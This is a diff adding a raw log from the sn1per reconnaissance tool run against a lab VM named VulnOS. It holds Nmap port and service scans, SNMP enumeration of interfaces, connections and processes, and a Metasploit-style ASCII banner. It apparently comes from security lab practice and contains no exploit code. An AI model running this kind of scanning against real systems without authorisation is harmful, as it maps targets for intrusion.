@@ -1,0 +1,2776 @@
+
+
+                ____               
+    _________  /  _/___  ___  _____
+   / ___/ __ \ / // __ \/ _ \/ ___/
+  (__  ) / / // // /_/ /  __/ /    
+ /____/_/ /_/___/ .___/\___/_/     
+               /_/                 
+
+ + -- --=[http://crowdshield.com
+ + -- --=[sn1per v1.5 by 1N3
+
+################################### Running recon #################################
+Server:		192.168.1.1
+Address:	192.168.1.1#53
+
+** server can't find 141.1.168.192.in-addr.arpa: NXDOMAIN
+
+Host 141.1.168.192.in-addr.arpa. not found: 3(NXDOMAIN)
+
+################################### Pinging host ###################################
+PING 192.168.1.141 (192.168.1.141) 56(84) bytes of data.
+64 bytes from 192.168.1.141: icmp_seq=1 ttl=64 time=0.255 ms
+
+--- 192.168.1.141 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.255/0.255/0.255/0.000 ms
+
+################################### Running port scan ##############################
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 10:47 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00029s latency).
+Not shown: 65513 closed ports
+PORT      STATE         SERVICE     VERSION
+22/tcp    open          ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 43:a6:84:8d:be:1a:ee:fb:ed:c3:23:53:14:14:8f:50 (DSA)
+|_  2048 30:1d:2d:c4:9e:66:d8:bd:70:7c:48:84:fb:b9:7b:09 (RSA)
+23/tcp    open          telnet      Linux telnetd
+25/tcp    open          smtp        Postfix smtpd
+|_smtp-commands: VulnOS.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=VulnOS.home
+| Not valid before: 2014-03-09T14:00:56
+|_Not valid after:  2024-03-06T14:00:56
+|_ssl-date: 2015-12-28T15:48:43+00:00; -18s from scanner time.
+53/tcp    open          domain      ISC BIND 9.7.0-P1
+80/tcp    open          http        Apache httpd 2.2.14 ((Ubuntu))
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-title: index
+110/tcp   open          pop3        Dovecot pop3d
+|_pop3-capabilities: RESP-CODES SASL CAPA UIDL TOP STLS PIPELINING
+| ssl-cert: Subject: commonName=VulnOS.home
+| Not valid before: 2014-03-09T14:00:56
+|_Not valid after:  2024-03-06T14:00:56
+|_ssl-date: 2015-12-28T15:48:42+00:00; -18s from scanner time.
+111/tcp   open          rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      44465/udp  mountd
+|   100005  1,2,3      57008/tcp  mountd
+|   100021  1,3,4      47875/tcp  nlockmgr
+|   100021  1,3,4      51332/udp  nlockmgr
+|   100024  1          45297/udp  status
+|_  100024  1          51775/tcp  status
+139/tcp   open          netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+143/tcp   open          imap        Dovecot imapd
+|_imap-capabilities: IMAP4rev1 THREAD=REFS LITERAL+ IDLE I18NLEVEL=1 completed CONDSTORE CONTEXT=SEARCH QRESYNC SORT=DISPLAY UIDPLUS ESORT CHILDREN SASL-IR OK LOGINDISABLEDA0001 WITHIN STARTTLS LIST-EXTENDED SEARCHRES Capability ID UNSELECT ENABLE LOGIN-REFERRALS THREAD=REFERENCES NAMESPACE ESEARCH MULTIAPPEND SORT
+| ssl-cert: Subject: commonName=VulnOS.home
+| Not valid before: 2014-03-09T14:00:56
+|_Not valid after:  2024-03-06T14:00:56
+|_ssl-date: 2015-12-28T15:48:42+00:00; -17s from scanner time.
+389/tcp   open          ldap        OpenLDAP 2.2.X - 2.3.X
+445/tcp   open          netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+512/tcp   open          exec        netkit-rsh rexecd
+513/tcp   open          login?
+514/tcp   open          shell?
+901/tcp   open          http        Samba SWAT administration server
+| http-auth: 
+| HTTP/1.0 401 Authorization Required
+|_  Basic realm=SWAT
+|_http-title: 401 Authorization Required
+993/tcp   open          ssl/imap    Dovecot imapd
+|_imap-capabilities: IMAP4rev1 THREAD=REFS LITERAL+ IDLE I18NLEVEL=1 completed CONDSTORE CONTEXT=SEARCH QRESYNC SORT=DISPLAY UIDPLUS ESORT CHILDREN SASL-IR OK AUTH=LOGINA0001 WITHIN AUTH=PLAIN LIST-EXTENDED SEARCHRES Capability ID UNSELECT ENABLE LOGIN-REFERRALS THREAD=REFERENCES NAMESPACE ESEARCH MULTIAPPEND SORT
+| ssl-cert: Subject: commonName=VulnOS.home
+| Not valid before: 2014-03-09T14:00:56
+|_Not valid after:  2024-03-06T14:00:56
+|_ssl-date: 2015-12-28T15:48:43+00:00; -17s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|_  ciphers: none
+995/tcp   open          ssl/pop3    Dovecot pop3d
+|_pop3-capabilities: RESP-CODES SASL(PLAIN LOGIN) CAPA USER TOP UIDL PIPELINING
+| ssl-cert: Subject: commonName=VulnOS.home
+| Not valid before: 2014-03-09T14:00:56
+|_Not valid after:  2024-03-06T14:00:56
+|_ssl-date: 2015-12-28T15:48:38+00:00; -18s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|_  ciphers: none
+2000/tcp  open          sieve       Dovecot timsieved
+2049/tcp  open          nfs         2-4 (RPC #100003)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      44465/udp  mountd
+|   100005  1,2,3      57008/tcp  mountd
+|   100021  1,3,4      47875/tcp  nlockmgr
+|   100021  1,3,4      51332/udp  nlockmgr
+|   100024  1          45297/udp  status
+|_  100024  1          51775/tcp  status
+3306/tcp  open          mysql       MySQL 5.1.73-0ubuntu0.10.04.1
+|_mysql-info: ERROR: Script execution failed (use -d to debug)
+3632/tcp  open          distccd     distccd v1 ((Ubuntu 4.4.3-4ubuntu5.1) 4.4.3)
+6667/tcp  open          irc         IRCnet ircd
+| irc-info: 
+|   users: 1
+|   servers: 1
+|   chans: 15
+|   lusers: 1
+|   lservers: 0
+|   server: irc.localhost
+|   version: 2.11.2p1. irc.localhost 000A 
+|   uptime: 0 days, 0:21:44
+|   source ident: NONE or BLOCKED
+|   source host: 192.168.1.149
+|_  error: Closing Link: hwyukljuc[~nmap@192.168.1.149] ("")
+8070/tcp  open          unknown
+8080/tcp  open          http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat
+10000/tcp open          http        MiniServ 0.01 (Webmin httpd)
+|_http-server-header: MiniServ/0.01
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+47875/tcp open          nlockmgr    1-4 (RPC #100021)
+51775/tcp open          status      1 (RPC #100024)
+57008/tcp open          mountd      1-3 (RPC #100005)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      44465/udp  mountd
+|   100005  1,2,3      57008/tcp  mountd
+|   100021  1,3,4      47875/tcp  nlockmgr
+|   100021  1,3,4      51332/udp  nlockmgr
+|   100024  1          45297/udp  status
+|_  100024  1          51775/tcp  status
+53/udp    open          domain      ISC BIND 9.7.0-P1
+| dns-nsid: 
+|_  bind.version: 9.7.0-P1
+|_dns-recursion: Recursion appears to be enabled
+68/udp    open|filtered dhcpc
+137/udp   open          netbios-ns  Samba nmbd (workgroup: WORKGROUP)
+138/udp   open|filtered netbios-dgm
+161/udp   open          snmp        SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-hh3c-logins: 
+|_  baseoid: 1.3.6.1.4.1.25506.2.12.1.1.1
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: a2bd0a2e28cd1c53
+|   snmpEngineBoots: 30
+|_  snmpEngineTime: 21m34s
+| snmp-interfaces: 
+|   lo
+|     IP address: 127.0.0.1  Netmask: 255.0.0.0
+|     Type: softwareLoopback  Speed: 10 Mbps
+|     Traffic stats: 54.27 Kb sent, 54.27 Kb received
+|   eth0
+|     IP address: 192.168.1.141  Netmask: 255.255.255.0
+|     MAC address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+|     Type: ethernetCsmacd  Speed: 10 Mbps
+|_    Traffic stats: 31.09 Mb sent, 30.16 Mb received
+| snmp-netstat: 
+|   TCP  0.0.0.0:22           0.0.0.0:0
+|   TCP  0.0.0.0:23           0.0.0.0:0
+|   TCP  0.0.0.0:25           0.0.0.0:0
+|   TCP  0.0.0.0:110          0.0.0.0:0
+|   TCP  0.0.0.0:111          0.0.0.0:0
+|   TCP  0.0.0.0:143          0.0.0.0:0
+|   TCP  0.0.0.0:389          0.0.0.0:0
+|   TCP  0.0.0.0:512          0.0.0.0:0
+|   TCP  0.0.0.0:513          0.0.0.0:0
+|   TCP  0.0.0.0:514          0.0.0.0:0
+|   TCP  0.0.0.0:901          0.0.0.0:0
+|   TCP  0.0.0.0:993          0.0.0.0:0
+|   TCP  0.0.0.0:995          0.0.0.0:0
+|   TCP  0.0.0.0:2000         0.0.0.0:0
+|   TCP  0.0.0.0:2049         0.0.0.0:0
+|   TCP  0.0.0.0:3306         0.0.0.0:0
+|   TCP  0.0.0.0:3632         0.0.0.0:0
+|   TCP  0.0.0.0:6667         0.0.0.0:0
+|   TCP  0.0.0.0:8070         0.0.0.0:0
+|   TCP  0.0.0.0:10000        0.0.0.0:0
+|   TCP  0.0.0.0:47875        0.0.0.0:0
+|   TCP  0.0.0.0:51775        0.0.0.0:0
+|   TCP  0.0.0.0:57008        0.0.0.0:0
+|   TCP  127.0.0.1:53         0.0.0.0:0
+|   TCP  127.0.0.1:631        0.0.0.0:0
+|   TCP  127.0.0.1:953        0.0.0.0:0
+|   TCP  127.0.0.1:5432       0.0.0.0:0
+|   TCP  127.0.0.1:8069       0.0.0.0:0
+|   TCP  127.0.0.1:11211      0.0.0.0:0
+|   TCP  192.168.1.141:22     192.168.1.149:59387
+|   TCP  192.168.1.141:22     192.168.1.149:59388
+|   TCP  192.168.1.141:22     192.168.1.149:59402
+|   TCP  192.168.1.141:53     0.0.0.0:0
+|   TCP  192.168.1.141:80     192.168.1.149:45413
+|   TCP  192.168.1.141:514    192.168.1.149:588
+|   TCP  192.168.1.141:901    192.168.1.149:59611
+|   TCP  192.168.1.141:901    192.168.1.149:59624
+|   TCP  192.168.1.141:901    192.168.1.149:59629
+|   TCP  192.168.1.141:901    192.168.1.149:59633
+|   TCP  192.168.1.141:901    192.168.1.149:59635
+|   TCP  192.168.1.141:901    192.168.1.149:59637
+|   TCP  192.168.1.141:901    192.168.1.149:59638
+|   TCP  192.168.1.141:901    192.168.1.149:59650
+|   TCP  192.168.1.141:901    192.168.1.149:59651
+|   TCP  192.168.1.141:47875  192.168.1.149:892
+|   TCP  192.168.1.141:51775  192.168.1.149:433
+|   TCP  192.168.1.141:51775  192.168.1.149:763
+|   TCP  192.168.1.141:57008  192.168.1.149:848
+|   UDP  0.0.0.0:68           *:*
+|   UDP  0.0.0.0:111          *:*
+|   UDP  0.0.0.0:137          *:*
+|   UDP  0.0.0.0:138          *:*
+|   UDP  0.0.0.0:161          *:*
+|   UDP  0.0.0.0:895          *:*
+|   UDP  0.0.0.0:2049         *:*
+|   UDP  0.0.0.0:10000        *:*
+|   UDP  0.0.0.0:44465        *:*
+|   UDP  0.0.0.0:45297        *:*
+|   UDP  0.0.0.0:49659        *:*
+|   UDP  0.0.0.0:51332        *:*
+|   UDP  127.0.0.1:53         *:*
+|   UDP  127.0.0.1:11211      *:*
+|   UDP  192.168.1.141:53     *:*
+|   UDP  192.168.1.141:137    *:*
+|_  UDP  192.168.1.141:138    *:*
+| snmp-processes: 
+|   1: 
+|     Name: init
+|     Path: /sbin/init
+|   2: 
+|     Name: kthreadd
+|   3: 
+|     Name: migration/0
+|   4: 
+|     Name: ksoftirqd/0
+|   5: 
+|     Name: watchdog/0
+|   6: 
+|     Name: events/0
+|   7: 
+|     Name: cpuset
+|   8: 
+|     Name: khelper
+|   9: 
+|     Name: netns
+|   10: 
+|     Name: async/mgr
+|   11: 
+|     Name: pm
+|   12: 
+|     Name: sync_supers
+|   13: 
+|     Name: bdi-default
+|   14: 
+|     Name: kintegrityd/0
+|   15: 
+|     Name: kblockd/0
+|   16: 
+|     Name: kacpid
+|   17: 
+|     Name: kacpi_notify
+|   18: 
+|     Name: kacpi_hotplug
+|   19: 
+|     Name: ata/0
+|   20: 
+|     Name: ata_aux
+|   21: 
+|     Name: ksuspend_usbd
+|   22: 
+|     Name: khubd
+|   23: 
+|     Name: kseriod
+|   24: 
+|     Name: kmmcd
+|   27: 
+|     Name: khungtaskd
+|   28: 
+|     Name: kswapd0
+|   29: 
+|     Name: ksmd
+|   30: 
+|     Name: aio/0
+|   31: 
+|     Name: ecryptfs-kthrea
+|   32: 
+|     Name: crypto/0
+|   36: 
+|     Name: scsi_eh_0
+|   37: 
+|     Name: scsi_eh_1
+|   40: 
+|     Name: kstriped
+|   41: 
+|     Name: kmpathd/0
+|   42: 
+|     Name: kmpath_handlerd
+|   43: 
+|     Name: ksnapd
+|   44: 
+|     Name: kondemand/0
+|   45: 
+|     Name: kconservative/0
+|   203: 
+|     Name: scsi_eh_2
+|   208: 
+|     Name: usbhid_resumer
+|   221: 
+|     Name: kdmflush
+|   225: 
+|     Name: kdmflush
+|   239: 
+|     Name: jbd2/dm-0-8
+|   240: 
+|     Name: ext4-dio-unwrit
+|   272: 
+|     Name: flush-251:0
+|   302: 
+|     Name: upstart-udev-br
+|     Params: --daemon
+|   304: 
+|     Name: udevd
+|     Params: --daemon
+|   430: 
+|     Name: udevd
+|     Params: --daemon
+|   462: 
+|     Name: udevd
+|     Params: --daemon
+|   506: 
+|     Name: kpsmoused
+|   595: 
+|     Name: portmap
+|   670: 
+|     Name: smbd
+|     Params: -F
+|   686: 
+|     Name: rsyslogd
+|     Params: -c4
+|   689: 
+|     Name: dbus-daemon
+|     Params: --system --fork
+|   704: 
+|     Name: smbd
+|     Params: -F
+|   719: 
+|     Name: rpc.statd
+|     Params: -L
+|   763: 
+|     Name: getty
+|     Params: -8 38400 tty4
+|   769: 
+|     Name: getty
+|     Params: -8 38400 tty5
+|   774: 
+|     Name: getty
+|     Params: -8 38400 tty2
+|   775: 
+|     Name: getty
+|     Params: -8 38400 tty3
+|   779: 
+|     Name: getty
+|     Params: -8 38400 tty6
+|   794: 
+|     Name: cron
+|   795: 
+|     Name: atd
+|   806: 
+|     Name: named
+|     Params: -u bind
+|   824: 
+|     Name: mysqld
+|   825: 
+|     Name: dhclient3
+|     Params: -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp3/dhclient.eth0.leases eth0
+|   874: 
+|     Name: sshd
+|     Params: -D
+|   888: 
+|     Name: postgres
+|     Params: -D /var/lib/postgresql/8.4/main -c config_file=/etc/postgresql/8.4/main/postgresql.conf
+|   902: 
+|     Name: nmbd
+|     Params: -D
+|   911: 
+|     Name: postgres
+|   912: 
+|     Name: postgres
+|   913: 
+|     Name: postgres
+|   914: 
+|     Name: postgres
+|   1073: 
+|     Name: slapd
+|     Params: -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d/
+|   1094: 
+|     Name: distccd
+|     Params: --pid-file=/var/run/distccd.pid --log-file=/var/log/distccd.log --daemon --allow 192.168.1.1/24 --listen 0.0.0.0 --nice 10 --zer
+|   1109: 
+|     Name: distccd
+|     Params: --pid-file=/var/run/distccd.pid --log-file=/var/log/distccd.log --daemon --allow 192.168.1.1/24 --listen 0.0.0.0 --nice 10 --zer
+|   1116: 
+|     Name: ircd
+|   1119: 
+|     Name: iauth
+|   1122: 
+|     Name: memcached
+|     Params: -m 64 -p 11211 -u nobody -l 127.0.0.1
+|   1134: 
+|     Name: rpciod/0
+|   1176: 
+|     Name: lockd
+|   1180: 
+|     Name: nfsd4
+|   1182: 
+|     Name: nfsd
+|   1183: 
+|     Name: nfsd
+|   1184: 
+|     Name: nfsd
+|   1185: 
+|     Name: nfsd
+|   1186: 
+|     Name: nfsd
+|   1187: 
+|     Name: nfsd
+|   1189: 
+|     Name: nfsd
+|   1190: 
+|     Name: nfsd
+|   1196: 
+|     Name: rpc.mountd
+|     Params: --manage-gids
+|   1215: 
+|     Name: inetd
+|   1368: 
+|     Name: master
+|   1375: 
+|     Name: pickup
+|     Params: -l -t fifo -u -c
+|   1376: 
+|     Name: qmgr
+|     Params: -l -t fifo -u
+|   1396: 
+|     Name: snmpd
+|     Params: -Lsd -Lf /dev/null -u snmp -g snmp -I -smux -p /var/run/snmpd.pid -c /etc/snmp/snmpd.conf
+|   1410: 
+|     Name: python
+|     Params: ./openerp-server.py --config=/etc/openerp-server.conf
+|   1432: 
+|     Name: dovecot
+|     Params: -c /etc/dovecot/dovecot.conf
+|   1437: 
+|     Name: dovecot-auth
+|   1443: 
+|     Name: dovecot-auth
+|     Params: -w
+|   1500: 
+|     Name: distccd
+|     Params: --pid-file=/var/run/distccd.pid --log-file=/var/log/distccd.log --daemon --allow 192.168.1.1/24 --listen 0.0.0.0 --nice 10 --zer
+|   1517: 
+|     Name: tlsmgr
+|     Params: -l -t unix -u -c
+|   1541: 
+|     Name: nagios3
+|     Params: -d /etc/nagios3/nagios.cfg
+|   1582: 
+|     Name: cupsd
+|     Params: -C /etc/cups/cupsd.conf
+|   1640: 
+|     Name: apache2
+|     Params: -k start
+|   1662: 
+|     Name: apache2
+|     Params: -k start
+|   1663: 
+|     Name: apache2
+|     Params: -k start
+|   1664: 
+|     Name: apache2
+|     Params: -k start
+|   1665: 
+|     Name: apache2
+|     Params: -k start
+|   1666: 
+|     Name: apache2
+|     Params: -k start
+|   1685: 
+|     Name: java
+|     Params: -Djava.util.logging.config.file=/var/lib/tomcat6/conf/logging.properties -Djava.awt.headless=true -Xmx128M -XX:+UseConcMarkSweep
+|   1692: 
+|     Name: managesieve-log
+|   1693: 
+|     Name: managesieve-log
+|   1725: 
+|     Name: distccd
+|     Params: --pid-file=/var/run/distccd.pid --log-file=/var/log/distccd.log --daemon --allow 192.168.1.1/24 --listen 0.0.0.0 --nice 10 --zer
+|   3636: 
+|     Name: miniserv.pl
+|     Params: /var/www/webmin-1.280/miniserv.pl /etc/webmin/miniserv.conf
+|   3640: 
+|     Name: getty
+|     Params: -8 38400 tty1
+|   3794: 
+|     Name: apache2
+|     Params: -k start
+|   4303: 
+|     Name: proxymap
+|     Params: -t unix -u
+|   4304: 
+|     Name: anvil
+|     Params: -l -t unix -u -c
+|   4414: 
+|     Name: apache2
+|     Params: -k start
+|   4422: 
+|     Name: apache2
+|     Params: -k start
+|   4423: 
+|     Name: apache2
+|     Params: -k start
+|   4641: 
+|     Name: apache2
+|     Params: -k start
+|   13662: 
+|     Name: smtpd
+|     Params: -n smtp -t inet -u -c -o stress= -s 2
+|   19578: 
+|     Name: pop3-login
+|   19581: 
+|     Name: pop3-login
+|   19582: 
+|     Name: pop3-login
+|   19584: 
+|     Name: pop3-login
+|   19585: 
+|     Name: pop3-login
+|   19586: 
+|     Name: pop3-login
+|   19587: 
+|     Name: pop3-login
+|   19588: 
+|     Name: pop3-login
+|   19589: 
+|     Name: pop3-login
+|   19590: 
+|     Name: pop3-login
+|   19591: 
+|     Name: pop3-login
+|   19592: 
+|     Name: pop3-login
+|   19593: 
+|     Name: pop3-login
+|   19594: 
+|     Name: pop3-login
+|   19595: 
+|     Name: pop3-login
+|   19596: 
+|     Name: pop3-login
+|   19597: 
+|     Name: pop3-login
+|   19598: 
+|     Name: pop3-login
+|   19599: 
+|     Name: pop3-login
+|   19600: 
+|     Name: pop3-login
+|   19601: 
+|     Name: pop3-login
+|   19602: 
+|     Name: pop3-login
+|   19603: 
+|     Name: pop3-login
+|   19604: 
+|     Name: pop3-login
+|   19606: 
+|     Name: pop3-login
+|   19607: 
+|     Name: pop3-login
+|   19608: 
+|     Name: pop3-login
+|   19609: 
+|     Name: pop3-login
+|   19610: 
+|     Name: pop3-login
+|   19611: 
+|     Name: pop3-login
+|   19612: 
+|     Name: pop3-login
+|   19615: 
+|     Name: pop3-login
+|   19617: 
+|     Name: pop3-login
+|   19618: 
+|     Name: pop3-login
+|   19619: 
+|     Name: pop3-login
+|   19620: 
+|     Name: pop3-login
+|   19621: 
+|     Name: pop3-login
+|   19622: 
+|     Name: pop3-login
+|   19623: 
+|     Name: pop3-login
+|   19624: 
+|     Name: pop3-login
+|   19625: 
+|     Name: pop3-login
+|   19626: 
+|     Name: pop3-login
+|   19627: 
+|     Name: pop3-login
+|   19628: 
+|     Name: pop3-login
+|   19629: 
+|     Name: pop3-login
+|   19630: 
+|     Name: pop3-login
+|   19631: 
+|     Name: pop3-login
+|   19632: 
+|     Name: pop3-login
+|   19633: 
+|     Name: pop3-login
+|   19634: 
+|     Name: pop3-login
+|   19635: 
+|     Name: pop3-login
+|   19636: 
+|     Name: pop3-login
+|   19637: 
+|     Name: pop3-login
+|   19639: 
+|     Name: pop3-login
+|   19640: 
+|     Name: pop3-login
+|   19641: 
+|     Name: pop3-login
+|   19642: 
+|     Name: pop3-login
+|   19643: 
+|     Name: pop3-login
+|   19644: 
+|     Name: pop3-login
+|   19645: 
+|     Name: pop3-login
+|   19646: 
+|     Name: pop3-login
+|   19647: 
+|     Name: pop3-login
+|   19648: 
+|     Name: pop3-login
+|   19649: 
+|     Name: pop3-login
+|   19650: 
+|     Name: pop3-login
+|   19651: 
+|     Name: pop3-login
+|   19652: 
+|     Name: pop3-login
+|   19653: 
+|     Name: pop3-login
+|   19654: 
+|     Name: pop3-login
+|   19655: 
+|     Name: pop3-login
+|   19656: 
+|     Name: pop3-login
+|   19657: 
+|     Name: pop3-login
+|   19658: 
+|     Name: pop3-login
+|   19659: 
+|     Name: pop3-login
+|   19660: 
+|     Name: pop3-login
+|   19661: 
+|     Name: pop3-login
+|   19662: 
+|     Name: pop3-login
+|   19663: 
+|     Name: pop3-login
+|   19664: 
+|     Name: pop3-login
+|   19665: 
+|     Name: pop3-login
+|   19666: 
+|     Name: pop3-login
+|   19667: 
+|     Name: pop3-login
+|   19668: 
+|     Name: pop3-login
+|   19669: 
+|     Name: pop3-login
+|   19670: 
+|     Name: pop3-login
+|   19671: 
+|     Name: pop3-login
+|   19672: 
+|     Name: pop3-login
+|   19673: 
+|     Name: pop3-login
+|   19674: 
+|     Name: pop3-login
+|   19675: 
+|     Name: pop3-login
+|   19676: 
+|     Name: pop3-login
+|   19677: 
+|     Name: pop3-login
+|   19678: 
+|     Name: pop3-login
+|   19679: 
+|     Name: pop3-login
+|   19680: 
+|     Name: pop3-login
+|   19681: 
+|     Name: pop3-login
+|   19682: 
+|     Name: pop3-login
+|   19683: 
+|     Name: pop3-login
+|   19684: 
+|     Name: pop3-login
+|   19685: 
+|     Name: pop3-login
+|   19686: 
+|     Name: pop3-login
+|   19687: 
+|     Name: pop3-login
+|   19688: 
+|     Name: pop3-login
+|   19689: 
+|     Name: pop3-login
+|   19690: 
+|     Name: pop3-login
+|   19692: 
+|     Name: pop3-login
+|   19693: 
+|     Name: pop3-login
+|   19694: 
+|     Name: pop3-login
+|   19695: 
+|     Name: pop3-login
+|   19696: 
+|     Name: pop3-login
+|   19698: 
+|     Name: pop3-login
+|   19699: 
+|     Name: pop3-login
+|   19700: 
+|     Name: pop3-login
+|   19701: 
+|     Name: pop3-login
+|   19702: 
+|     Name: pop3-login
+|   19703: 
+|     Name: pop3-login
+|   19704: 
+|     Name: pop3-login
+|   19705: 
+|     Name: pop3-login
+|   19706: 
+|     Name: pop3-login
+|   19708: 
+|     Name: pop3-login
+|   19711: 
+|     Name: pop3-login
+|   19712: 
+|     Name: pop3-login
+|   19713: 
+|     Name: pop3-login
+|   19746: 
+|     Name: managesieve-log
+|   19773: 
+|     Name: smtpd
+|     Params: -n smtp -t inet -u -c -o stress= -s 2
+|   19779: 
+|     Name: imap-login
+|   20055: 
+|     Name: pop3-login
+|   20061: 
+|     Name: pop3-login
+|   20063: 
+|     Name: pop3-login
+|   20082: 
+| 
+|   20153: 
+|     Name: smtpd
+|     Params: -n smtp -t inet -u -c -o stress= -s 2
+|   20157: 
+|     Name: pop3-login
+|   20178: 
+|     Name: pop3-login
+|   20179: 
+|     Name: imap-login
+|   20180: 
+|     Name: imap-login
+|   20190: 
+| 
+|   20191: 
+| 
+|   20194: 
+| 
+|   20195: 
+| 
+|   20202: 
+| 
+|   20203: 
+| 
+|   20204: 
+| 
+|   20205: 
+| 
+|   20213: 
+| 
+|   20214: 
+| 
+|   20215: 
+| 
+|   20216: 
+| 
+|   20217: 
+| 
+|   20218: 
+| 
+|   20226: 
+| 
+|_  20227: 
+| snmp-sysdescr: Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686
+|_  System uptime: 21m34.43s (129443 timeticks)
+2049/udp  open          nfs         2-4 (RPC #100003)
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux 2.6.32
+Network Distance: 1 hop
+Service Info: Hosts:  VulnOS.home, irc.localhost, VULNOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: VULNOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.29 ms 192.168.1.141
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 172.50 seconds
+
+################################### Running Intrusive Scans ########################
++ -- --=[Port 21 closed... skipping.
++ -- --=[Port 22 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 10:50 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00018s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 43:a6:84:8d:be:1a:ee:fb:ed:c3:23:53:14:14:8f:50 (DSA)
+|_  2048 30:1d:2d:c4:9e:66:d8:bd:70:7c:48:84:fb:b9:7b:09 (RSA)
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3.33 seconds
+                                                  
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
